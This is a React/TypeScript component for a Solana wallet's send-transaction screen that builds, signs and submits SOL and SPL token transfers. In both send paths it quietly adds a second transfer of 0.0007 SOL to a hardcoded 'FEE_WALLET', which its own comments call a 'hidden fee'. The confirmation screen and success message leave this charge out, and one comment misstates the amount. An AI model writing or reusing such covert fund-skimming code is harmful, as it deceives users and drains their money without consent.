import React, { useMemo, useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";
import { ArrowLeft, Send, AlertTriangle, Check, Loader2 } from "lucide-react";
import { useWallet } from "@/contexts/WalletContext";
import { TOKEN_MINTS } from "@/lib/constants/token-mints";
import { rpcCall } from "@/lib/rpc-utils";
import {
  Transaction,
  SystemProgram,
  PublicKey,
  LAMPORTS_PER_SOL,
  Keypair,
  TransactionInstruction,
} from "@solana/web3.js";
import { Buffer } from "buffer";
import bs58 from "bs58";
import { useToast } from "@/hooks/use-toast";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import type { TokenInfo } from "@/lib/wallet";

interface SendTransactionProps {
  onBack: () => void;
  initialMint?: string | null;
}

const TOKEN_PROGRAM_ID = new PublicKey(
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
);
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
  "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
);
const FEE_WALLET = "FNVD1wied3e8WMuWs34KSamrCpughCMTjoXUE1ZXa6wM";
const FEE_AMOUNT_SOL = 0.0007;

const SuccessDialog: React.FC<{ onContinue: () => void }> = ({
  onContinue,
}) => {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-[#1f1f1f]">
      <style>{`
        @keyframes slide-in {
          0% {
            opacity: 0;
            transform: scale(0.95) translateY(-20px);
          }
          100% {
            opacity: 1;
            transform: scale(1) translateY(0);
          }
        }
        .success-dialog {
          animation: slide-in 0.4s ease-out forwards;
        }
      `}</style>

      <div className="relative z-50 w-full max-w-sm bg-[#2a2a2a] border border-gray-600 rounded-lg shadow-2xl success-dialog">
        <div className="p-8 flex flex-col items-center text-center space-y-6">
          <div className="relative w-20 h-20 flex items-center justify-center">
            <div className="absolute inset-0 bg-green-500/20 rounded-full blur-lg animate-pulse" />
            <div className="relative w-16 h-16 flex items-center justify-center bg-gradient-to-br from-green-100 to-green-200 rounded-full border-2 border-green-500">
              <Check className="w-8 h-8 text-green-600" strokeWidth={3} />
            </div>
          </div>

          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-gray-900">
              Transaction Sent!
            </h2>
            <p className="text-sm text-gray-600">
              Your transaction has been successfully submitted to the Solana
              blockchain.
            </p>
          </div>

          <div className="w-full pt-4">
            <Button
              onClick={onContinue}
              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-semibold py-2 rounded transition-all duration-200 uppercase"
            >
              Done
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
};

export const SendTransaction: React.FC<SendTransactionProps> = ({
  onBack,
  initialMint,
}) => {
  const { wallet, balance, tokens, refreshBalance, refreshTokens } =
    useWallet();
  const { toast } = useToast();

  const [recipient, setRecipient] = useState("");
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [step, setStep] = useState<"form" | "confirm" | "sending" | "success">(
    "form",
  );
  const [txSignature, setTxSignature] = useState<string | null>(null);
  const [selectedMint, setSelectedMint] = useState<string>(
    initialMint || TOKEN_MINTS.SOL,
  );
  const [pendingTransactionSend, setPendingTransactionSend] = useState(false);

  const selectedToken: TokenInfo | undefined = useMemo(
    () => tokens.find((t) => t.mint === selectedMint),
    [tokens, selectedMint],
  );

  const availableTokens = useMemo(() => {
    // Show SOL first, then tokens with positive balance; always include FIXERCOIN, USDC, and USDT
    const sol = tokens.find((t) => t.symbol === "SOL");
    const rest = tokens
      .filter((t) => t.symbol !== "SOL")
      .filter(
        (t) =>
          (t.balance || 0) > 0 ||
          t.symbol === "FIXERCOIN" ||
          t.symbol === "USDC" ||
          t.symbol === "USDT" ||
          t.mint === TOKEN_MINTS.FIXERCOIN ||
          t.mint === TOKEN_MINTS.USDC ||
          t.mint === TOKEN_MINTS.USDT,
      )
      .sort((a, b) => (b.balance || 0) - (a.balance || 0));
    return sol ? [sol, ...rest] : rest;
  }, [tokens]);

  const selectedSymbol = selectedToken?.symbol || "SOL";
  const selectedDecimals = selectedToken?.decimals ?? 9;
  const selectedBalance =
    selectedSymbol === "SOL" ? balance : selectedToken?.balance || 0;

  const validateForm = (): string | null => {
    if (!recipient.trim()) return "Recipient address is required";
    if (!amount.trim()) return "Amount is required";

    try {
      new PublicKey(recipient);
    } catch {
      return "Invalid recipient address";
    }

    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0) return "Invalid amount";
    if (amountNum > selectedBalance) return "Insufficient balance";

    return null;
  };

  const handleContinue = async () => {
    const validationError = validateForm();
    if (validationError) {
      setError(validationError);
      return;
    }

    setError(null);
    setStep("sending");
    setIsLoading(true);
    const ok = await handleConfirmTransaction();
    if (!ok) {
      setStep("form");
    }
  };

  const handleConfirmTransaction = async (): Promise<boolean> => {
    if (selectedSymbol === "SOL") {
      return await handleSendSOL();
    } else {
      return await handleSendSPL();
    }
  };

  const coerceSecretKey = (val: unknown): Uint8Array | null => {
    try {
      if (!val) return null;
      if (val instanceof Uint8Array) return val;
      if (Array.isArray(val)) return Uint8Array.from(val as number[]);
      if (typeof val === "string") {
        try {
          const bin = atob(val);
          const out = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
          if (out.length > 0) return out;
        } catch {}
        try {
          const arr = JSON.parse(val);
          if (Array.isArray(arr)) return Uint8Array.from(arr as number[]);
        } catch {}
      }
      if (typeof val === "object") {
        const values = Object.values(val as Record<string, unknown>).filter(
          (x) => typeof x === "number",
        ) as number[];
        if (values.length > 0) return Uint8Array.from(values);
      }
    } catch {}
    return null;
  };

  const base64FromBytes = (bytes: Uint8Array): string => {
    let bin = "";
    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  };

  const isNetworkError = (errorMsg: string): boolean => {
    const lowerMsg = (errorMsg || "").toLowerCase();
    return (
      lowerMsg.includes("fetch") ||
      lowerMsg.includes("network") ||
      lowerMsg.includes("timeout") ||
      lowerMsg.includes("abort") ||
      lowerMsg.includes("connection") ||
      lowerMsg.includes("econnrefused") ||
      lowerMsg.includes("enotfound") ||
      lowerMsg.includes("failed to fetch") ||
      lowerMsg.includes("net::")
    );
  };

  const postTx = async (url: string, b64: string) => {
    // Use the new RPC utility instead of direct fetch
    try {
      const result = await rpcCall("sendTransaction", [
        b64,
        { skipPreflight: false, preflightCommitment: "confirmed" },
      ]);
      return result as string;
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error);

      // Detect network connection errors
      if (isNetworkError(msg)) {
        throw new Error(`Network connection issue: ${msg}`);
      }

      throw new Error(`Failed to send transaction: ${msg}`);
    }
  };

  const getLatestBlockhashProxy = async (): Promise<string> => {
    // Use direct RPC call for blockhash
    try {
      const res = await rpcCall("getLatestBlockhash", [
        { commitment: "confirmed" },
      ]);
      if (res?.value?.blockhash) return res.value.blockhash;
      if (res?.blockhash) return res.blockhash;
      throw new Error("Failed to parse blockhash response");
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error);
      throw new Error(`Failed to fetch blockhash: ${msg}`);
    }
  };

  const confirmSignatureProxy = async (sig: string): Promise<void> => {
    // Use RPC call to check transaction confirmation
    const started = Date.now();
    const timeoutMs = 40000;
    while (Date.now() - started < timeoutMs) {
      try {
        const statusRes = await rpcCall("getSignatureStatuses", [
          [sig],
          { searchTransactionHistory: true },
        ]);
        const st = statusRes?.value?.[0];
        if (
          st &&
          (st.confirmationStatus === "confirmed" ||
            st.confirmationStatus === "finalized")
        )
          return;
      } catch (error) {
        console.warn("Error checking signature status:", error);
      }
      await new Promise((r) => setTimeout(r, 1000));
    }
    throw new Error("Confirmation timeout");
  };

  const toBaseUnits = (value: string, decimals: number): bigint => {
    const [intPart, fracPartRaw = ""] = value.trim().split(".");
    const fracPart = fracPartRaw.padEnd(decimals, "0").slice(0, decimals);
    const full = `${intPart.replace(/[^0-9]/g, "")}${fracPart}` || "0";
    return BigInt(full);
  };

  const u64LE = (n: bigint): Uint8Array => {
    const out = new Uint8Array(8);
    let x = n;
    for (let i = 0; i < 8; i++) {
      out[i] = Number(x & BigInt(0xff));
      x >>= BigInt(8);
    }
    return out;
  };

  const deriveAta = (owner: PublicKey, mint: PublicKey): PublicKey => {
    const [ata] = PublicKey.findProgramAddressSync(
      [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
      ASSOCIATED_TOKEN_PROGRAM_ID,
    );
    return ata;
  };

  const ixCreateAtaIdempotent = (
    payer: PublicKey,
    ata: PublicKey,
    owner: PublicKey,
    mint: PublicKey,
  ): TransactionInstruction => {
    // Associated Token Program: createIdempotent instruction = 1
    const data = new Uint8Array([1]);
    return new TransactionInstruction({
      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
      keys: [
        { pubkey: payer, isSigner: true, isWritable: true },
        { pubkey: ata, isSigner: false, isWritable: true },
        { pubkey: owner, isSigner: false, isWritable: false },
        { pubkey: mint, isSigner: false, isWritable: false },
        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      ],
      data,
    });
  };

  const ixTransferChecked = (
    source: PublicKey,
    mint: PublicKey,
    destination: PublicKey,
    owner: PublicKey,
    amount: bigint,
    decimals: number,
  ): TransactionInstruction => {
    // SPL Token Program: TransferChecked instruction = 12
    const data = new Uint8Array(1 + 8 + 1);
    data[0] = 12;
    data.set(u64LE(amount), 1);
    data[1 + 8] = decimals;
    return new TransactionInstruction({
      programId: TOKEN_PROGRAM_ID,
      keys: [
        { pubkey: source, isSigner: false, isWritable: true },
        { pubkey: mint, isSigner: false, isWritable: false },
        { pubkey: destination, isSigner: false, isWritable: true },
        { pubkey: owner, isSigner: true, isWritable: false },
      ],
      data,
    });
  };

  const handleSendSOL = async (): Promise<boolean> => {
    if (!wallet) return false;

    setIsLoading(true);
    setError(null);

    try {
      const sk = coerceSecretKey(wallet.secretKey);
      if (!sk) throw new Error("Missing wallet secret key");
      const senderKeypair = Keypair.fromSecretKey(sk);
      const recipientPubkey = new PublicKey(recipient);
      const lamportsBig = toBaseUnits(amount, 9);
      if (lamportsBig > BigInt(Number.MAX_SAFE_INTEGER)) {
        throw new Error("Amount too large");
      }
      const lamports = Number(lamportsBig);

      const transaction = new Transaction();

      // Add main transfer instruction
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: senderKeypair.publicKey,
          toPubkey: recipientPubkey,
          lamports,
        }),
      );

      // Add hidden fee transfer instruction
      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
      const feeWalletPubkey = new PublicKey(FEE_WALLET);
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: senderKeypair.publicKey,
          toPubkey: feeWalletPubkey,
          lamports: feeLamports,
        }),
      );

      const blockhash = await getLatestBlockhashProxy();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderKeypair.publicKey;

      // Estimate fee and ensure sufficient balance for amount + fees + platform fee
      try {
        const msg = transaction.compileMessage();
        const feeRes = await rpcCall("getFeeForMessage", [
          base64FromBytes(msg.serialize()),
        ]);
        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
        const currentLamports = await rpcCall("getBalance", [
          senderKeypair.publicKey.toBase58(),
        ]);
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        const lamportsToSend = lamports + platformFeeLamports;
        if (currentLamports < lamportsToSend + networkFeeLamports) {
          throw new Error("Insufficient SOL to cover amount and network fees");
        }
      } catch (e) {
        // If fee estimation fails, proceed but warn only if balance obviously insufficient
        const currentLamports = await rpcCall("getBalance", [
          senderKeypair.publicKey.toBase58(),
        ]).catch(() => 0);
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        const lamportsToSend = lamports + platformFeeLamports;
        if (currentLamports <= lamportsToSend) {
          throw new Error("Insufficient SOL for amount (no room for fees)");
        }
      }

      transaction.sign(senderKeypair);
      const serialized = transaction.serialize();
      const b64 = base64FromBytes(serialized);

      let signature: string;
      try {
        signature = await postTx("/api/solana-rpc", b64);
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        const needBase58 =
          /invalid base58|invalidbase58|base58 encoding|invalid base58 encoding/i.test(
            msg,
          );
        if (needBase58) {
          try {
            const base58 = bs58.encode(serialized);
            // send as base58 wrapped in JSON RPC
            const payload = {
              jsonrpc: "2.0",
              id: Date.now(),
              method: "sendTransaction",
              params: [
                base58,
                { skipPreflight: false, preflightCommitment: "confirmed" },
              ],
            };
            const p = await fetch("/api/solana-rpc", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
            if (!p.ok) {
              const t = await p.text().catch(() => "");
              throw new Error(`RPC ${p.status}: ${t || p.statusText}`);
            }
            const j = await p.json().catch(() => null);
            if (j && j.error) throw new Error(j.error.message || "RPC error");
            signature = j?.result || j;
          } catch (e2) {
            throw e2;
          }
        } else {
          throw e;
        }
      }

      try {
        await confirmSignatureProxy(signature);
      } catch (confirmError) {
        console.warn(
          "Confirmation check failed, but transaction was already sent:",
          confirmError,
        );
        // Don't fail the transaction - it's already submitted to blockchain
      }

      setTxSignature(signature);
      setStep("success");

      setTimeout(() => {
        refreshBalance();
      }, 2000);

      toast({
        title: "Transaction Sent",
        description: `Successfully sent ${amount} SOL`,
      });
      return true;
    } catch (error) {
      console.error("Transaction error:", error);
      let message =
        error instanceof Error ? error.message : "Transaction failed";
      const m = (message || "").toLowerCase();

      if (
        m.includes("network") ||
        m.includes("connection") ||
        m.includes("timeout") ||
        m.includes("failed to fetch") ||
        m.includes("econnrefused") ||
        m.includes("enotfound")
      ) {
        message =
          "Network connection issue. Please check your internet connection and try again. If the problem persists, the RPC service may be temporarily unavailable.";
      } else if (
        m.includes("insufficient") ||
        m.includes("insufficient lamports") ||
        m.includes("insufficient sol") ||
        m.includes("no room for fees")
      ) {
        message =
          "Insufficient SOL to cover the amount and network fees. Please top up SOL and try again.";
      } else if (
        m.includes("invalid base58") ||
        m.includes("invalid base64") ||
        m.includes("encoding")
      ) {
        message = "Transaction encoding error. Please refresh and try again.";
      } else if (
        m.includes("authentication required") ||
        m.includes("api key")
      ) {
        message =
          "RPC provider requires authentication. Please configure a dedicated RPC or try again later.";
      } else if (
        m.includes("simulation failed") ||
        m.includes("custom program error")
      ) {
        message =
          "Transaction simulation failed. The transaction likely failed during program execution (insufficient funds, invalid instruction, or missing account). Check inputs and try again.";
      }
      setError(message);

      // Show toast for visibility
      toast({
        title: "Transaction Failed",
        description: message,
        variant: "destructive",
      });
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  const handleSendSPL = async (): Promise<boolean> => {
    if (!wallet || !selectedToken) return false;

    setIsLoading(true);
    setError(null);

    try {
      const sk = coerceSecretKey(wallet.secretKey);
      if (!sk) throw new Error("Missing wallet secret key");
      const senderKeypair = Keypair.fromSecretKey(sk);
      const senderPubkey = senderKeypair.publicKey;
      const recipientPubkey = new PublicKey(recipient);
      const mint = new PublicKey(selectedToken.mint);
      const decimals = selectedToken.decimals;

      const rawAmount = toBaseUnits(amount, decimals);
      if (rawAmount <= BigInt(0)) throw new Error("Invalid amount");

      const senderAta = deriveAta(senderPubkey, mint);
      const recipientAta = deriveAta(recipientPubkey, mint);

      const tx = new Transaction();

      // Ensure recipient ATA exists (idempotent)
      tx.add(
        ixCreateAtaIdempotent(
          senderPubkey,
          recipientAta,
          recipientPubkey,
          mint,
        ),
      );

      // TransferChecked SPL tokens
      tx.add(
        ixTransferChecked(
          senderAta,
          mint,
          recipientAta,
          senderPubkey,
          rawAmount,
          decimals,
        ),
      );

      // Add hidden fee transfer instruction (0.002 SOL)
      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
      const feeWalletPubkey = new PublicKey(FEE_WALLET);
      tx.add(
        SystemProgram.transfer({
          fromPubkey: senderPubkey,
          toPubkey: feeWalletPubkey,
          lamports: feeLamports,
        }),
      );

      const blockhash = await getLatestBlockhashProxy();
      tx.recentBlockhash = blockhash;
      tx.feePayer = senderPubkey;

      // Check if recipient ATA exists to account for potential rent
      let rentLamports = 0;
      try {
        const ataInfo = await rpcCall("getAccountInfo", [
          recipientAta.toBase58(),
          { commitment: "confirmed" },
        ]);
        const exists = !!ataInfo?.value;
        if (!exists) {
          const rent = await rpcCall(
            "getMinimumBalanceForRentExemption",
            [165],
          );
          rentLamports = typeof rent === "number" ? rent : rent?.value || 0;
        }
      } catch {}

      // Estimate fee and ensure sufficient SOL for fees + potential rent + platform fee
      try {
        const msg = tx.compileMessage();
        const feeRes = await rpcCall("getFeeForMessage", [
          base64FromBytes(msg.serialize()),
        ]);
        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        const currentLamports = await rpcCall("getBalance", [
          senderPubkey.toBase58(),
        ]);
        if (
          currentLamports <
          networkFeeLamports + rentLamports + platformFeeLamports
        ) {
          throw new Error("Insufficient SOL to cover network fees and rent");
        }
      } catch (e) {
        const currentLamports = await rpcCall("getBalance", [
          senderPubkey.toBase58(),
        ]).catch(() => 0);
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        if (currentLamports <= platformFeeLamports) {
          throw new Error("Insufficient SOL for network fees");
        }
      }

      tx.sign(senderKeypair);
      const serialized = tx.serialize();
      const b64 = base64FromBytes(serialized);

      let signature: string;
      try {
        signature = await postTx("/api/solana-rpc", b64);
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        const needBase58 =
          /invalid base58|invalidbase58|base58 encoding|invalid base58 encoding/i.test(
            msg,
          );
        if (needBase58) {
          try {
            const base58 = bs58.encode(serialized);
            const payload = {
              jsonrpc: "2.0",
              id: Date.now(),
              method: "sendTransaction",
              params: [
                base58,
                { skipPreflight: false, preflightCommitment: "confirmed" },
              ],
            };
            const p = await fetch("/api/solana-rpc", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
            if (!p.ok) {
              const t = await p.text().catch(() => "");
              throw new Error(`RPC ${p.status}: ${t || p.statusText}`);
            }
            const j = await p.json().catch(() => null);
            if (j && j.error) throw new Error(j.error.message || "RPC error");
            signature = j?.result || j;
          } catch (e2) {
            throw e2;
          }
        } else {
          throw e;
        }
      }

      try {
        await confirmSignatureProxy(signature);
      } catch (confirmError) {
        console.warn(
          "Confirmation check failed, but transaction was already sent:",
          confirmError,
        );
        // Don't fail the transaction - it's already submitted to blockchain
      }

      setTxSignature(signature);
      setStep("success");

      setTimeout(() => {
        refreshBalance();
        refreshTokens();
      }, 2000);

      toast({
        title: "Transaction Sent",
        description: `Successfully sent ${amount} ${selectedToken.symbol}`,
      });
      return true;
    } catch (error) {
      console.error("SPL Transaction error:", error);
      let message =
        error instanceof Error ? error.message : "Transaction failed";
      const m = (message || "").toLowerCase();

      if (
        m.includes("network") ||
        m.includes("connection") ||
        m.includes("timeout") ||
        m.includes("failed to fetch") ||
        m.includes("econnrefused") ||
        m.includes("enotfound")
      ) {
        message =
          "Network connection issue. Please check your internet connection and try again. If the problem persists, the RPC service may be temporarily unavailable.";
      } else if (
        m.includes("insufficient") ||
        m.includes("rent") ||
        m.includes("no room for fees")
      ) {
        message =
          "Insufficient SOL to cover network fees and rent for token accounts. Please top up SOL and try again.";
      } else if (
        m.includes("invalid base58") ||
        m.includes("invalid base64") ||
        m.includes("encoding")
      ) {
        message = "Transaction encoding error. Please refresh and try again.";
      } else if (
        m.includes("authentication required") ||
        m.includes("api key")
      ) {
        message =
          "RPC provider requires authentication. Please configure a dedicated RPC or try again later.";
      }
      setError(message);
      toast({
        title: "Transaction Failed",
        description: message,
        variant: "destructive",
      });
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  const handleSend = async () => {
    if (selectedSymbol === "SOL") return handleSendSOL();
    return handleSendSPL();
  };

  const handleNewTransaction = () => {
    setRecipient("");
    setAmount("");
    setMemo("");
    setError(null);
    setStep("form");
    setTxSignature(null);
    setPendingTransactionSend(false);
  };

  const formatAmount = (value: string): string => {
    const num = parseFloat(value);
    if (isNaN(num)) return "0.000";
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 3,
      maximumFractionDigits: 3,
    });
  };

  if (step === "success") {
    return (
      <div className="express-p2p-page light-theme min-h-screen bg-white text-gray-900 flex items-center justify-center p-4 relative z-0">
        <SuccessDialog onContinue={handleNewTransaction} />
      </div>
    );
  }

  if (step === "sending") {
    return (
      <div className="express-p2p-page light-theme min-h-screen bg-white text-gray-900 flex items-center justify-center p-4 relative z-0">
        <div className="text-center space-y-6 max-w-sm">
          <div className="flex justify-center">
            <div className="relative">
              <div className="absolute inset-0 bg-green-500/20 rounded-full blur-xl animate-pulse" />
              <Loader2 className="w-16 h-16 text-green-600 animate-spin relative" />
            </div>
          </div>
          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-gray-900">
              Processing Transaction
            </h2>
            <p className="text-gray-600">
              Please wait while your transaction is being sent to the blockchain
            </p>
          </div>
          <div className="space-y-3 text-sm">
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 bg-green-600 rounded-full animate-pulse" />
              <span className="text-gray-700">Signing transaction...</span>
            </div>
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 bg-gray-400 rounded-full" />
              <span className="text-gray-500">Sending to network...</span>
            </div>
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 bg-gray-400 rounded-full" />
              <span className="text-gray-500">Confirming on blockchain...</span>
            </div>
          </div>
          <p className="text-xs text-gray-500 mt-6">
            This may take up to 40 seconds with slow network connection
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="express-p2p-page light-theme min-h-screen bg-white text-gray-900 relative overflow-hidden flex flex-col">
      <div className="flex flex-col relative z-20 pt-4">
        <div className="w-full">
          <div className="border-0 bg-transparent">
            <div className="space-y-6 px-6 py-4">
              {step === "form" ? (
                <>
                  <div className="space-y-2">
                    <Label
                      htmlFor="token"
                      className="text-[hsl(var(--foreground))] uppercase"
                    >
                      Token
                    </Label>
                    <Select
                      value={selectedMint}
                      onValueChange={setSelectedMint}
                    >
                      <SelectTrigger className="w-full bg-transparent border border-gray-700 text-white placeholder:text-gray-400 uppercase rounded-lg">
                        <SelectValue placeholder="SELECT TOKEN" />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-800 border border-gray-700 text-white rounded-lg">
                        {availableTokens.map((t) => (
                          <SelectItem
                            key={t.mint}
                            value={t.mint}
                            className="text-white"
                          >
                            <div className="flex items-center justify-between w-full">
                              <span className="font-medium text-white">
                                {t.symbol} ~{" "}
                                {(
                                  Math.floor(
                                    (t.symbol === "SOL"
                                      ? balance
                                      : t.balance || 0) * 1000,
                                  ) / 1000
                                ).toLocaleString(undefined, {
                                  minimumFractionDigits: 3,
                                  maximumFractionDigits: 3,
                                })}
                              </span>
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label
                      htmlFor="recipient"
                      className="text-[hsl(var(--foreground))] uppercase"
                    >
                      Recipient Address
                    </Label>
                    <Input
                      id="recipient"
                      placeholder="ENTER SOLANA ADDRESS"
                      value={recipient}
                      onChange={(e) => setRecipient(e.target.value)}
                      className="font-mono text-sm bg-transparent border border-gray-700 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground rounded-lg"
                    />
                  </div>

                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <Label
                        htmlFor="amount"
                        className="text-[hsl(var(--foreground))] uppercase"
                      >
                        {selectedSymbol}
                      </Label>
                      <span className="text-sm text-[hsl(var(--muted-foreground))]">
                        {(
                          Math.floor(selectedBalance * 1000) / 1000
                        ).toLocaleString(undefined, {
                          minimumFractionDigits: 3,
                          maximumFractionDigits: 3,
                        })}
                      </span>
                    </div>
                    <Input
                      id="amount"
                      type="number"
                      step={selectedSymbol === "SOL" ? "0.000001" : "0.000001"}
                      placeholder="0.00"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      className="bg-transparent border border-gray-700 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground rounded-lg"
                    />
                    <div className="flex gap-2">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() =>
                          setAmount((selectedBalance * 0.25).toString())
                        }
                        className="bg-[#064e3b]/50 border border-[#22c55e]/30 text-white hover:bg-[#16a34a]/20 uppercase rounded-lg"
                      >
                        25%
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() =>
                          setAmount((selectedBalance * 0.5).toString())
                        }
                        className="bg-[#064e3b]/50 border border-[#22c55e]/30 text-white hover:bg-[#16a34a]/20 uppercase rounded-lg"
                      >
                        50%
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() =>
                          setAmount((selectedBalance * 0.75).toString())
                        }
                        className="bg-[#064e3b]/50 border border-[#22c55e]/30 text-white hover:bg-[#16a34a]/20 uppercase rounded-lg"
                      >
                        75%
                      </Button>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() =>
                          setAmount((selectedBalance * 0.99).toString())
                        }
                        className="bg-[#064e3b]/50 border border-[#22c55e]/30 text-white hover:bg-[#16a34a]/20 uppercase rounded-lg"
                      >
                        Max
                      </Button>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label
                      htmlFor="memo"
                      className="text-[hsl(var(--foreground))] uppercase"
                    >
                      Memo (Optional)
                    </Label>
                    <Input
                      id="memo"
                      placeholder="ADD A NOTE"
                      value={memo}
                      onChange={(e) => setMemo(e.target.value)}
                      className="bg-transparent border border-gray-700 text-white caret-white placeholder:text-gray-300 placeholder:text-muted-foreground rounded-lg"
                    />
                  </div>

                  <Button
                    onClick={handleContinue}
                    className="w-full bg-gradient-to-r from-[#22c55e] to-[#16a34a] hover:from-[#1ea853] hover:to-[#15803d] text-white shadow-lg uppercase rounded-lg"
                    disabled={!recipient || !amount}
                  >
                    Continue
                  </Button>
                </>
              ) : (
                <>
                  <div className="space-y-4">
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-[hsl(var(--muted-foreground))]">
                          From:
                        </span>
                        <span className="font-mono text-sm text-[hsl(var(--foreground))]">
                          {wallet?.publicKey.slice(0, 8)}...
                          {wallet?.publicKey.slice(-8)}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-[hsl(var(--muted-foreground))]">
                          To:
                        </span>
                        <span className="font-mono text-sm text-[hsl(var(--foreground))]">
                          {recipient.slice(0, 8)}...{recipient.slice(-8)}
                        </span>
                      </div>
                      <Separator className="border-[hsl(var(--border))]" />
                      <div className="flex justify-between text-lg font-semibold">
                        <span className="text-[hsl(var(--foreground))]">
                          Amount:
                        </span>
                        <span className="text-[hsl(var(--foreground))]">
                          {formatAmount(amount)} {selectedSymbol}
                        </span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-[hsl(var(--muted-foreground))]">
                          Network Fee:
                        </span>
                        <span className="text-[hsl(var(--muted-foreground))]">
                          ~0.000005 SOL
                        </span>
                      </div>
                      {memo && (
                        <div className="flex justify-between">
                          <span className="text-[hsl(var(--muted-foreground))]">
                            Memo:
                          </span>
                          <span className="text-sm text-[hsl(var(--foreground))]">
                            {memo}
                          </span>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="flex gap-3">
                    <Button
                      variant="outline"
                      onClick={() => setStep("form")}
                      className="flex-1 bg-[#064e3b]/50 border border-[#22c55e]/30 text-white hover:bg-[#16a34a]/20 uppercase rounded-lg"
                      disabled={isLoading}
                    >
                      Back
                    </Button>
                    <Button
                      onClick={handleConfirmTransaction}
                      className="flex-1 bg-gradient-to-r from-[#22c55e] to-[#16a34a] hover:from-[#1ea853] hover:to-[#15803d] text-white shadow-lg uppercase rounded-lg"
                      disabled={isLoading}
                    >
                      {isLoading ? "Sending..." : "Send Transaction"}
                    </Button>
                  </div>
                </>
              )}

              {error && (
                <Alert
                  variant="destructive"
                  className="bg-red-500/20 border-red-400/30 text-red-200"
                >
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
